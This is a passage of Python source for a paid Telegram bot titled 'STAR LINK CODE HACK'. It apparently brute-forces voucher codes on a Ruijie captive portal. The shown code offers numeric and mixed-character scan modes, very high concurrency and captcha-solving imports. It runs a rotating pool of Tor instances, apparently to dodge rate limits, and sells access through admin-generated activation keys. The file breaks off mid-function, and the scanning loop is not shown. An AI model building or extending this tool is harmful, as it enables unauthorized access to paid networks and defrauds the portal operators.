import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures, io
import hashlib, hmac, secrets
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from aiohttp import web
from aiohttp_socks import ProxyConnector
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from urllib.parse import urlsplit

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()
REPO_OWNER = os.getenv("REPO_OWNER", "").strip()
REPO_NAME = os.getenv("REPO_NAME", "").strip()
GITHUB_BRANCH = os.getenv("GITHUB_BRANCH", "main").strip()
ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
PROXY_FILE_PATH = os.getenv("PROXY_FILE_PATH", "proxies.json").strip() or "proxies.json"
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_session_pool = {}
session = None
_connector = None
_tor_connectors = []
_manual_proxy_connectors = []
_tor_processes = []
_tor_rr = 0
_proxy_rr = 0
TOR_POOL_SIZE = 5
CONCURRENCY = 5000
_voucher_sem = None
_start_time = time.monotonic()
proxy_enabled = False
proxy_mode = "direct"
_auto_rotate_task = None
AUTO_ROTATE_INTERVAL = 360
awaiting_session_url = set()
awaiting_proxy_input = set()
pending_genkey_plan = {}
awaiting_delete_key = set()
awaiting_key_code = set()

USER_KEY_BUTTON = "🟢 PAID USER"
USER_INPUT_BUTTON = "🌟 STAR LINK Portal URL"
USER_SCAN_BUTTON = "🔴 Scan စမယ်"
USER_RESULT_BUTTON = "📄 Success Codes"
USER_RECHECK_BUTTON = "🔄 Recheck"
USER_STOP_BUTTON = "🔴 Stop"
PROXY_STATUS_BUTTON = "🟢 Proxy ON"
ADD_PROXY_BUTTON = "➕ Add Proxies"
ADMIN_PANEL_BUTTON = "⚒️ Admin Panel"
MENU_BUTTON = "⬅️ Back"
ADMIN_GENKEY_BUTTON = "🔑 Key ထုတ်မယ်"
ADMIN_LISTKEY_BUTTON = "📋 Key စာရင်း"
ADMIN_DELKEY_BUTTON = "🗑 Key ဖျက်မယ်"
ADMIN_STATUS_BUTTON = "📊 Bot Status"
ADMIN_STATS_BUTTON = "📡 Scan Stats"

def build_main_menu(chat_id):
    menu = types.InlineKeyboardMarkup(row_width=2)
    menu.add(
        types.InlineKeyboardButton(USER_KEY_BUTTON, callback_data="menu:key"),
        types.InlineKeyboardButton(USER_INPUT_BUTTON, callback_data="menu:input"),
        types.InlineKeyboardButton(PROXY_STATUS_BUTTON, callback_data="menu:proxy"),
        types.InlineKeyboardButton(ADD_PROXY_BUTTON, callback_data="menu:addproxy"),
        types.InlineKeyboardButton(USER_RESULT_BUTTON, callback_data="menu:result"),
        types.InlineKeyboardButton(USER_RECHECK_BUTTON, callback_data="menu:recheck"),
        types.InlineKeyboardButton(USER_SCAN_BUTTON, callback_data="menu:scan"),
    )
    if str(chat_id) == ADMIN_ID:
        menu.add(types.InlineKeyboardButton(ADMIN_PANEL_BUTTON, callback_data="menu:admin"))
    menu.add(types.InlineKeyboardButton(MENU_BUTTON, callback_data="menu:home"))
    return menu

def build_admin_menu():
    menu = types.InlineKeyboardMarkup(row_width=2)
    menu.add(
        types.InlineKeyboardButton(ADMIN_GENKEY_BUTTON, callback_data="menu:genkey"),
        types.InlineKeyboardButton(ADMIN_LISTKEY_BUTTON, callback_data="menu:listkeys"),
        types.InlineKeyboardButton(ADMIN_DELKEY_BUTTON, callback_data="menu:delkey"),
        types.InlineKeyboardButton(ADMIN_STATUS_BUTTON, callback_data="menu:status"),
        types.InlineKeyboardButton(ADMIN_STATS_BUTTON, callback_data="menu:stats"),
    )
    menu.add(types.InlineKeyboardButton(MENU_BUTTON, callback_data="menu:home"))
    return menu

def build_back_menu():
    menu = types.InlineKeyboardMarkup()
    menu.add(types.InlineKeyboardButton(MENU_BUTTON, callback_data="menu:home"))
    return menu

def build_key_activation_menu():
    menu = types.InlineKeyboardMarkup(row_width=1)
    menu.add(
        types.InlineKeyboardButton(
            "✅ KEY ထည့်ရန်",
            callback_data="key:enter"
        )
    )
    menu.add(types.InlineKeyboardButton(MENU_BUTTON, callback_data="menu:home"))
    return menu

def build_proxy_count_menu():
    menu = types.InlineKeyboardMarkup(row_width=2)
    for count in (1, 3, 5, 10):
        menu.add(
            types.InlineKeyboardButton(
                f"➕ {count} Proxy",
                callback_data=f"proxy:start:{count}"
            )
        )
    menu.add(
        types.InlineKeyboardButton(
            "📂 Saved Proxies",
            callback_data="proxy:start:saved"
        ),
        types.InlineKeyboardButton(
            "➕ Add Proxies",
            callback_data="menu:addproxyinput"
        )
    )
    menu.add(types.InlineKeyboardButton(MENU_BUTTON, callback_data="menu:home"))
    return menu

def build_proxy_control_menu():
    menu = types.InlineKeyboardMarkup(row_width=2)
    if proxy_enabled:
        buttons = [
            types.InlineKeyboardButton(
                "🔴 Proxy ပိတ်မယ်",
                callback_data="proxy:stop"
            )
        ]
        if proxy_mode == "tor":
            buttons.append(
                types.InlineKeyboardButton(
                    "🔄 Rotate",
                    callback_data="proxy:rotate"
                )
            )
        else:
            buttons.append(
                types.InlineKeyboardButton(
                    "📂 Reload Saved",
                    callback_data="proxy:reload"
                )
            )
        menu.add(*buttons)
    else:
        menu.add(
            types.InlineKeyboardButton(
                "▶️ Proxy စမယ်",
                callback_data="proxy:start:5"
            ),
            types.InlineKeyboardButton(
                "➕ Add Proxies",
                callback_data="menu:addproxy"
            )
        )
    menu.add(types.InlineKeyboardButton(MENU_BUTTON, callback_data="menu:home"))
    return menu

def build_scan_stop_menu():
    menu = types.InlineKeyboardMarkup()
    menu.add(types.InlineKeyboardButton(USER_STOP_BUTTON, callback_data="menu:stop"))
    return menu

def portal_instruction_text():
    return (
        "⚙️ Portal URL ထည့်သွင်းရန်:\n\n"
        "/portal [your_portal_url]\n\n"
        "ဥပမာ:\n"
        "/portal https://portal-as.ruijienetworks.com/download/static/"
        "maccauth/src/index.html?lang=en_US"
    )

async def build_main_menu_text(chat_id, telegram_user=None):
    if telegram_user is not None:
        display_name = (
            getattr(telegram_user, "full_name", None)
            or getattr(telegram_user, "username", None)
            or "Unknown"
        )
        username = getattr(telegram_user, "username", None)
    else:
        display_name = "Unknown"
        username = None

    account = f"@{username}" if username else "မရှိပါ"
    key_status = "No"
    plan = "-"
    expires = "-"
    key_record = None

    try:
        auth_list, _ = await get_file_content("auth_list.json")
        key_record = auth_list.get(str(chat_id))
        if key_record is not None:
            if isinstance(key_record, dict):
                key_status = "Yes" if has_active_key(key_record) else "No"
                plan = key_record.get("plan", "-")
                expires = key_record.get("expires_at", "-")
            else:
                key_status = "Yes" if has_active_key(key_record) else "No"
                plan = "old"
                expires = str(key_record)
    except Exception as e:
        print(f"[build_main_menu_text] {e}")

    profile = (
        "🌟 STAR LINK CODE HACK 🌟\n"
        "Thank for using By Telegram @bopaing_789\n\n"
        f"👤 NAME: {display_name} |\n"
        f"🆔 USER ID: {chat_id}\n"
        f"👤Account : {account}\n\n"
    )
    if key_record is None:
        return profile + "🚫 သင်၏ user ID ကို registered မလုပ်ရသေးပါ။"

    if key_status != "Yes":
        if isinstance(key_record, dict) and key_record.get("activation_code_hash"):
            return profile + "🔑 PAID USER ကိုနှိပ်ပြီး Admin ပေးထားတဲ့ Key Code ကိုထည့်ပါ။"
        return profile + "⚠️ KEY EXPIRED\n"
    if str(plan).lower() == "unlimited":
        access = "Unlimited Access"
    else:
        access = f"{plan} Access"
    proxy_status = "ON" if proxy_enabled else "OFF"
    proxy_icon = "🟢" if proxy_enabled else "🔴"
    return (
        profile
        + f"🟢 PAID USER - {access}\n"
        + f"{proxy_icon} Proxy Status: {proxy_status}"
    )

async def remove_legacy_reply_keyboard(chat_id):
    """Remove old persistent keyboards without leaving a visible status message."""
    cleanup_message = await bot.send_message(
        chat_id,
        "\u2063",
        reply_markup=types.ReplyKeyboardRemove()
    )
    try:
        await bot.delete_message(chat_id, cleanup_message.message_id)
    except Exception as e:
        print(f"[remove_legacy_reply_keyboard] {e}")

def build_scan_menu():
    menu = types.InlineKeyboardMarkup(row_width=2)
    menu.add(
        types.InlineKeyboardButton("🔢 Number 6", callback_data="scan:6"),
        types.InlineKeyboardButton("🔢 Number 7", callback_data="scan:7"),
        types.InlineKeyboardButton("🔢 Number 8", callback_data="scan:8"),
        types.InlineKeyboardButton("🔢 Number 9", callback_data="scan:9"),
        types.InlineKeyboardButton("🔤 ascii-lower", callback_data="scan:ascii-lower"),
        types.InlineKeyboardButton("🔤➕🔢 Mix 6", callback_data="scan:mix-6"),
        types.InlineKeyboardButton("🔤➕🔢 Mix 7", callback_data="scan:mix-7"),
        types.InlineKeyboardButton("🔤➕🔢 Mix 8", callback_data="scan:mix-8"),
        types.InlineKeyboardButton("⬅️ Back", callback_data="menu:home"),
    )
    return menu

def build_number_prefix_menu(mode):
    menu = types.InlineKeyboardMarkup(row_width=5)
    for digit in string.digits:
        menu.add(
            types.InlineKeyboardButton(
                digit,
                callback_data=f"numberprefix:{mode}:{digit}"
            )
        )
    menu.add(
        types.InlineKeyboardButton(
            "🎲 Random",
            callback_data=f"numberprefix:{mode}:random"
        )
    )
    menu.add(types.InlineKeyboardButton("⬅️ Back", callback_data="menu:scan"))
    return menu

def build_plan_menu():
    menu = types.InlineKeyboardMarkup(row_width=1)
    menu.add(
        types.InlineKeyboardButton(
            "♾️ Unlimited Key Code",
            callback_data="genplan:unlimited"
        )
    )
    menu.add(types.InlineKeyboardButton("❌ Cancel", callback_data="ui:cancel"))
    return menu

def validate_config():
    required = {
        "BOT_TOKEN": BOT_TOKEN,
        "GITHUB_TOKEN": GITHUB_TOKEN,
        "REPO_OWNER": REPO_OWNER,
        "REPO_NAME": REPO_NAME,
        "ADMIN_ID": ADMIN_ID,
    }
    missing = [name for name, value in required.items() if not value]
    if missing:
        raise RuntimeError(
            "လိုအပ်သော Replit Secrets များ မထည့်ရသေးပါ: "
            + ", ".join(missing)
        )

async def auto_rotate_loop():
    while proxy_enabled and _tor_processes:
        await asyncio.sleep(AUTO_ROTATE_INTERVAL)
        if not proxy_enabled:
            break
        await rotate_tor()
        print(f"[auto-rotate] Rotated all {len(_tor_processes)} Tor circuits")

def _start_auto_rotate():
    global _auto_rotate_task
    if _auto_rotate_task and not _auto_rotate_task.done():
        _auto_rotate_task.cancel()
    _auto_rotate_task = asyncio.create_task(auto_rotate_loop())

def _stop_auto_rotate():
    global _auto_rotate_task
    if _auto_rotate_task and not _auto_rotate_task.done():
        _auto_rotate_task.cancel()
    _auto_rotate_task = None

def _next_tor_connector():
    global _tor_rr, _proxy_rr
    connectors = (
        _manual_proxy_connectors
        if proxy_mode == "manual"
        else _tor_connectors
    )
    if not connectors:
        return _connector
    if proxy_mode == "manual":
        c = connectors[_proxy_rr % len(connectors)]
        _proxy_rr = (_proxy_rr + 1) % len(connectors)
    else:
        c = connectors[_tor_rr % len(connectors)]
        _tor_rr = (_tor_rr + 1) % len(connectors)
    return c

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def rebuild_session(use_proxy=False, socks_ports=None, proxy_urls=None):
    global session, _connector, _tor_connectors, _manual_proxy_connectors
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    for c in _tor_connectors + _manual_proxy_connectors:
        if not c.closed:
            await c.close()
    _tor_connectors.clear()
    _manual_proxy_connectors.clear()
    timeout = aiohttp.ClientTimeout(total=30)
    if use_proxy and proxy_urls:
        _manual_proxy_connectors.extend(
            ProxyConnector.from_url(
                proxy_url,
                rdns=True, limit=2000, ssl=False
            )
            for proxy_url in proxy_urls
        )
        _connector = _manual_proxy_connectors[0]
    elif use_proxy and socks_ports:
        _tor_connectors.extend(
            ProxyConnector.from_url(
                f'socks5://127.0.0.1:{p}',
                rdns=True, limit=2000, ssl=False
            )
            for p in socks_ports
        )
        _connector = _tor_connectors[0]
    else:
        _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

async def _drain_stdout(proc, idx):
    if proc and proc.stdout:
        try:
            async for _ in proc.stdout:
                pass
        except Exception:
            pass

async def _start_one_tor(i):
    socks_port = 9050 + i * 2
    ctrl_port  = 9051 + i * 2
    data_dir   = f"/tmp/tor_bot_{i}"
    os.makedirs(data_dir, exist_ok=True)
    torrc = (
        f"SocksPort {socks_port}\n"
        f"ControlPort {ctrl_port}\n"
        f"DataDirectory {data_dir}\n"
        "CookieAuthentication 0\n"
        "Log notice stdout\n"
        "MaxCircuitDirtiness 10\n"
    )
    torrc_path = f"/tmp/torrc_bot_{i}"
    with open(torrc_path, "w") as f:
        f.write(torrc)
    proc = await asyncio.create_subprocess_exec(
        'tor', '-f', torrc_path,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT
    )
    print(f"[tor-{i}] Starting on socks={socks_port} ctrl={ctrl_port}...")
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        try:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=10)
        except asyncio.TimeoutError:
            continue
        if not line:
            print(f"[tor-{i}] process ended unexpectedly")
            return None
        line_str = line.decode(errors='replace').strip()
        print(f"[tor-{i}] {line_str}")
        if "Bootstrapped 100%" in line_str:
            print(f"[tor-{i}] Bootstrapped successfully on port {socks_port}")
            asyncio.create_task(_drain_stdout(proc, i))
            return proc
    print(f"[tor-{i}] Bootstrap timed out")
    return None

async def _kill_all_tor():
    for p in _tor_processes:
        try:
            if p.returncode is None:
                p.kill()
        except Exception:
            pass
    await asyncio.gather(*[
        p.wait() for p in _tor_processes if p.returncode is None
    ], return_exceptions=True)
    for cmd in [['pkill', '-9', 'tor'], ['pkill', '-9', '-f', 'torrc_bot']]:
        try:
            kp = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await kp.wait()
        except Exception:
            pass
    for i in range(20):
        lock = f"/tmp/tor_bot_{i}/lock"
        try:
            os.remove(lock)
        except FileNotFoundError:
            pass
    await asyncio.sleep(2)

async def start_tor_pool(n=None):
    global _tor_processes
    if n is None:
        n = TOR_POOL_SIZE
    await _kill_all_tor()
    _tor_processes.clear()
    results = await asyncio.gather(*[_start_one_tor(i) for i in range(n)])
    _tor_processes.extend(p for p in results if p is not None)
    print(f"[tor] Pool started: {len(_tor_processes)}/{n} instances up")
    return len(_tor_processes) > 0

async def rotate_tor():
    async def _rotate_one(ctrl_port):
        try:
            _, writer = await asyncio.open_connection('127.0.0.1', ctrl_port)
            writer.write(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n')
            await writer.drain()
            await asyncio.sleep(0.5)
            writer.close()
            await writer.wait_closed()
            return True
        except Exception as e:
            print(f"[tor] rotate error ctrl={ctrl_port}: {e}")
            return False
    ctrl_ports = [9051 + i * 2 for i in range(len(_tor_processes))]
    results = await asyncio.gather(*[_rotate_one(p) for p in ctrl_ports])
    return any(results)

async def get_current_ip():
    try:
        async with session.get('https://api.ipify.org?format=json') as r:
            data = await r.json()
            return data.get('ip', 'unknown')
    except Exception as e:
        print(f"[get_current_ip] {e}")
        return 'unknown'

async def get_ip_via_port(socks_port):
    try:
        conn = ProxyConnector.from_url(
            f'socks5://127.0.0.1:{socks_port}', rdns=True, ssl=False
        )
        async with aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as s:
            async with s.get('https://api.ipify.org?format=json') as r:
                data = await r.json()
                return data.get('ip', 'unknown')
    except Exception as e:
        return f'error'

async def get_all_proxy_ips():
    ports = [9050 + i * 2 for i in range(len(_tor_processes))]
    results = await asyncio.gather(*[get_ip_via_port(p) for p in ports])
    return list(zip(ports, results))

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    global proxy_enabled, proxy_mode
    args = message.text.split()

    # /proxy rotate — rotate all circuits, show all new IPs
    if len(args) > 1 and args[1].lower() == 'rotate':
        if not proxy_enabled:
            await bot.reply_to(message, "❌ Tor proxy မဖွင့်ရသေးပါ။ /proxy <n> ဖြင့်အရင်ဖွင့်ပါ။")
            return
        if proxy_mode != "tor":
            await bot.reply_to(message, "ℹ️ Saved proxy တွေမှာ rotate မရပါ။ Proxy ဖိုင်ထဲက list ကို update လုပ်ပြီး Reload Saved ကိုနှိပ်ပါ။")
            return
        ok = await rotate_tor()
        if ok:
            await asyncio.sleep(2)
            ip_pairs = await get_all_proxy_ips()
            lines = "\n".join(f"  #{i+1} (:{p}): {ip}" for i, (p, ip) in enumerate(ip_pairs))
            await bot.reply_to(message, f"🔄 Rotated {len(_tor_processes)} circuits\n\n🌐 New IPs:\n{lines}")
        else:
            await bot.reply_to(message, "❌ Circuit rotate မအောင်မြင်ပါ။")
        return

    # /proxy — no number, proxy already ON → turn off
    if proxy_enabled and (len(args) < 2 or not args[1].isdigit()):
        _stop_auto_rotate()
        await rebuild_session(use_proxy=False)
        proxy_enabled = False
        proxy_mode = "direct"
        ip = await get_current_ip()
        await bot.reply_to(message, f"✅ Tor Proxy ပိတ်ပြီးပါပြီ!\n🌐 Direct IP: {ip}")
        return

    if len(args) > 1 and args[1].lower() == "saved":
        await start_saved_proxy_pool(message)
        return

    # /proxy <n> — start N instances (or restart with new count)
    count = int(args[1]) if len(args) > 1 and args[1].isdigit() else TOR_POOL_SIZE
    if count < 1 or count > 10:
        await bot.reply_to(message, "❌ Instance count must be between 1 and 10")
        return

    # If already on, shut down first
    if proxy_enabled:
        _stop_auto_rotate()
        await rebuild_session(use_proxy=False)
        proxy_enabled = False
        proxy_mode = "direct"

    msg = await bot.reply_to(
        message,
        f"⏳ Starting {count} Tor instance(s) in parallel...\n"
        f"(each bootstraps separately, may take ~2 min)"
    )
    ok = await start_tor_pool(count)
    if not ok:
        await bot.edit_message_text("❌ Tor startup မအောင်မြင်ပါ။", message.chat.id, msg.message_id)
        return

    socks_ports = [9050 + i * 2 for i in range(len(_tor_processes))]
    await rebuild_session(use_proxy=True, socks_ports=socks_ports)
    proxy_enabled = True
    proxy_mode = "tor"
    _start_auto_rotate()

    # Fetch IP for every instance simultaneously
    ip_pairs = await get_all_proxy_ips()
    ip_lines = "\n".join(f"  #{i+1} (port {p}): {ip}" for i, (p, ip) in enumerate(ip_pairs))
    await bot.edit_message_text(
        f"✅ Tor Proxy Pool Ready!\n"
        f"🔀 Active instances: {len(_tor_processes)}/{count}\n\n"
        f"🌐 Exit IPs — all used simultaneously (round-robin):\n{ip_lines}\n\n"
        f"🔁 Auto-rotate: every 3 min (all IPs change automatically)\n"
        f"🔄 Manual rotate: /proxy rotate\n"
        f"🔴 Turn off: /proxy",
        message.chat.id, msg.message_id
    )

async def get_file_content(path):
    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
        raise RuntimeError(
            "GitHub config မပြည့်စုံပါ။ BOT_TOKEN, GITHUB_TOKEN, "
            "REPO_OWNER နဲ့ REPO_NAME ကို environment variables အဖြစ် ထည့်ပါ။"
        )
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Accept": "application/vnd.github+json",
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": "telegram-key-bot",
    }
    async with session.get(
        url, headers=headers, params={"ref": GITHUB_BRANCH}
    ) as response:
        response_text = await response.text()
        if response.status != 200:
            raise RuntimeError(
                f"GitHub read failed ({response.status}) for {path}: "
                f"{response_text[:500]}"
            )
        try:
            data = json.loads(response_text)
            content = base64.b64decode(data["content"]).decode("utf-8")
            return json.loads(content), data["sha"]
        except (KeyError, ValueError, json.JSONDecodeError) as e:
            raise RuntimeError(
                f"GitHub file {path} မှာ JSON/content မမှန်ပါ: {e}"
            ) from e

async def update_file_content(path, content, sha, message):
    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
        raise RuntimeError(
            "GitHub config မပြည့်စုံပါ။ BOT_TOKEN, GITHUB_TOKEN, "
            "REPO_OWNER နဲ့ REPO_NAME ကို environment variables အဖြစ် ထည့်ပါ။"
        )
    if not sha:
        raise RuntimeError(
            f"{path} အတွက် GitHub SHA မရပါ။ File မရှိတာ သို့မဟုတ် read request fail ဖြစ်နိုင်ပါတယ်။"
        )
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Accept": "application/vnd.github+json",
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "Content-Type": "application/json",
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": "telegram-key-bot",
    }
    encoded = base64.b64encode(
        json.dumps(content, ensure_ascii=False, indent=2).encode("utf-8")
    ).decode("ascii")
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha,
        "branch": GITHUB_BRANCH,
    }
    async with session.put(url, headers=headers, json=payload) as response:
        response_text = await response.text()
        if response.status not in (200, 201):
            raise RuntimeError(
                f"GitHub update failed ({response.status}) for {path}: "
                f"{response_text[:500]}"
            )
        return json.loads(response_text)

@bot.message_handler(commands=['start'])
async def start(message):
    awaiting_key_code.discard(message.chat.id)
    welcome = await build_main_menu_text(
        message.chat.id,
        message.from_user
    )
    # Remove the old persistent ReplyKeyboard from previous bot versions.
    await remove_legacy_reply_keyboard(message.chat.id)
    await bot.reply_to(
        message,
        welcome,
        reply_markup=build_main_menu(message.chat.id)
    )

@bot.message_handler(commands=['menu'])
async def show_menu(message):
    awaiting_key_code.discard(message.chat.id)
    menu_text = await build_main_menu_text(
        message.chat.id,
        message.from_user
    )
    await remove_legacy_reply_keyboard(message.chat.id)
    await bot.reply_to(
        message,
        menu_text,
        reply_markup=build_main_menu(message.chat.id)
    )

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    key_record = auth_list.get(key)
    if key_record is not None:
        if (
            isinstance(key_record, dict)
            and key_record.get("activation_code_hash")
            and not key_record.get("activated", False)
        ):
            awaiting_key_code.add(message.chat.id)
            await bot.reply_to(
                message,
                "🔑 PAID USER ပြီးနောက် Admin ပေးထားတဲ့ KEY ကို ဒီ chat ထဲမှာ ထည့်ပါ။\n\n"
                "✅ Bind Key ပြီးမှ Unlimited Access ရပါမယ်။\n"
                "ဥပမာ: BOPAING-ABCD1234XYZ\n\n"
                "Key မရသေးပါက Admin ကို ဆက်သွယ်ပါ။",
                reply_markup=build_key_activation_menu()
            )
            return
        valid = has_active_key(key_record)
        if valid:
            awaiting_key_code.discard(message.chat.id)
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(
                message,
                "✅ Key မှန်ကန်ပါသည်။\n"
                "🔗 Session URL ထည့်ပြီး Scan စတင်နိုင်ပါပြီ။",
                reply_markup=build_main_menu(message.chat.id)
            )
        else:
            approve[message.chat.id] = False
            await bot.reply_to(
                message,
                "⚠️ Key Expired ဖြစ်နေပါသည်။",
                reply_markup=build_main_menu(message.chat.id)
            )
    else:
        awaiting_key_code.discard(message.chat.id)
        await bot.reply_to(
            message,
            "❌ သင်၏ key ကို registered မလုပ်ရသေးပါ။",
            reply_markup=build_main_menu(message.chat.id)
        )

@bot.message_handler(commands=['paid'])
async def handle_paid_user(message):
    await handle_key(message)

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                activation = (
                    "Awaiting activation"
                    if data.get("activation_code_hash") and not data.get("activated")
                    else "Activated"
                    if data.get("activation_code_hash")
                    else "Legacy"
                )
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
                activation = "Legacy"
            lines.append(
                f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}\n"
                f"   Status: {activation}"
            )
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete key for {user_id}"
        )
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(
            message,
            f" Key Deleted\n\nUSER ID : {user_id}"
        )
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) != 2 or not args[1].isdigit():
            await bot.reply_to(message, "Usage:\n/genkey <user_id>")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id in auth_list:
            await bot.reply_to(
                message,
                f"⚠️ User ID {user_id} အတွက် Key ရှိပြီးသားပါ။\n"
                "အဟောင်းကို အစားထိုးလိုပါက /delkey <user_id> နဲ့အရင်ဖျက်ပါ။"
            )
            return
        code = "BOPAING-" + "".join(
            secrets.choice(string.ascii_uppercase + string.digits)
            for _ in range(11)
        )
        auth_list[user_id] = {
            "expires_at": "9999-12-31T23:59:59Z",
            "plan": "unlimited",
            "activation_code_hash": hashlib.sha256(
                code.encode("utf-8")
            ).hexdigest(),
            "activated": False
        }
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Generate activation key for {user_id}"
        )
        await bot.reply_to(
            message,
            f"✅ Key Code ထုတ်ပြီးပါပြီ\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : Unlimited\n"
            f"KEY CODE : `{code}`\n\n"
            "ဒီ Code ကို သတ်မှတ်ထားတဲ့ User ID ပိုင်ရှင်ဆီပဲ ပို့ပေးပါ။",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Error at genkey {e}")
        await bot.reply_to(
            message,
            f"❌ Key ထုတ်ပြီး GitHub သို့ update မလုပ်နိုင်ပါ။\n\n"
            f"အကြောင်းရင်း: {e}"
        )

@bot.message_handler(commands=['result'])
async def handle_result(message):
    auth_list, _ = await get_file_content("auth_list.json")
    if has_active_key(auth_list.get(str(message.chat.id))):
        results, _ = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            codes = "\n\n".join(
                f"🔑 {code}" for code in results[chat_id_str]
            )
            await send_hit_codes_file(
                message.chat.id,
                [f"🔑 {code}" for code in results[chat_id_str]],
            )
        else:
            await bot.reply_to(
                message,
                "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။",
                reply_markup=build_back_menu()
            )
    else:
        await bot.reply_to(
            message,
            "🚫 သင်၏ user ID ကို registered မလုပ်ရသေးပါ။",
            reply_markup=build_back_menu()
        )

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(
                expiry.replace("Z", "+00:00")
            )
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(
            int,
            expiration_time.split('-')
        )
        expiration_dt = datetime(
            year=yyyy,
            month=MM,
            day=dd,
            hour=hh,
            minute=mm,
            second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def has_active_key(key_record):
    if not check_key_expiration(key_record):
        return False
    if (
        isinstance(key_record, dict)
        and key_record.get("activation_code_hash")
        and not key_record.get("activated", False)
    ):
        return False
    return True

async def redeem_user_key(message, code):
    chat_id = message.chat.id
    user_id = str(chat_id)
    auth_list, sha = await get_file_content("auth_list.json")
    key_record = auth_list.get(user_id)
    if not isinstance(key_record, dict) or not key_record.get("activation_code_hash"):
        awaiting_key_code.discard(chat_id)
        await bot.reply_to(
            message,
            "❌ သင့် User ID အတွက် အသုံးပြုနိုင်တဲ့ Key Code မရှိပါ။"
        )
        return

    provided_hash = hashlib.sha256(code.strip().upper().encode("utf-8")).hexdigest()
    if not hmac.compare_digest(
        provided_hash,
        str(key_record["activation_code_hash"])
    ):
